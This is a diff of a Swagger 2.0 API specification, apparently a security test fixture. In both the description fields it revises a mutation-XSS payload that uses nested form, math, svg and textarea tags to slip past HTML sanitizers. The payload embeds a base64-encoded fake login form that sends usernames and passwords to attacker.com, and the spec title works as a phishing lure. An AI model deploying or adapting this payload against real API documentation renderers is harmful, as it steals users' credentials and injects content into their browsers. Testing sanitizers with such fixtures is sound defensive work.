@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Are you ready for a system upgrade? Enter your credentials to continue.
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea>Please login to continue.</textarea><object data='data:text/html;base64,PGZvcm0gYWN0aW9uPWh0dHBzOi8vYXR0YWNrZXIuY29tOjQ0NDM+VXNlcm5hbWU6PGJyPgo8aW5wdXQgdHlwZT0idXNlcm5hbWUiIG5hbWU9InVzZXJuYW1lIj48L2JyPlBhc3N3b3JkOjxicj4KPGlucHV0IHR5cGU9InVzZXJuYW1lIiBuYW1lPSJwYXNzd29yZCI+PC9icj48YnI+CjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJMb2dpbiI+PC9icj4='></object>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="<br />Please login to continue.</textarea><object data='data:text/html;base64,PGZvcm0gYWN0aW9uPWh0dHBzOi8vYXR0YWNrZXIuY29tOjQ0NDM+VXNlcm5hbWU6PGJyPgo8aW5wdXQgdHlwZT0idXNlcm5hbWUiIG5hbWU9InVzZXJuYW1lIj48L2JyPlBhc3N3b3JkOjxicj4KPGlucHV0IHR5cGU9InVzZXJuYW1lIiBuYW1lPSJwYXNzd29yZCI+PC9icj48YnI+CjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJMb2dpbiI+PC9icj4='></object>"></form>
   version: production
 basePath: /Resource/
 produces:
@@ -27,7 +27,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea>Please login to continue.</textarea><object data='data:text/html;base64,PGZvcm0gYWN0aW9uPWh0dHBzOi8vYXR0YWNrZXIuY29tOjQ0NDM+VXNlcm5hbWU6PGJyPgo8aW5wdXQgdHlwZT0idXNlcm5hbWUiIG5hbWU9InVzZXJuYW1lIj48L2JyPlBhc3N3b3JkOjxicj4KPGlucHV0IHR5cGU9InVzZXJuYW1lIiBuYW1lPSJwYXNzd29yZCI+PC9icj48YnI+CjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJMb2dpbiI+PC9icj4='></object>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="<br />Please login to continue.</textarea><object data='data:text/html;base64,PGZvcm0gYWN0aW9uPWh0dHBzOi8vYXR0YWNrZXIuY29tOjQ0NDM+VXNlcm5hbWU6PGJyPgo8aW5wdXQgdHlwZT0idXNlcm5hbWUiIG5hbWU9InVzZXJuYW1lIj48L2JyPlBhc3N3b3JkOjxicj4KPGlucHV0IHR5cGU9InVzZXJuYW1lIiBuYW1lPSJwYXNzd29yZCI+PC9icj48YnI+CjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJMb2dpbiI+PC9icj4='></object>"></form>
           format: int64
           in: path
           name: id
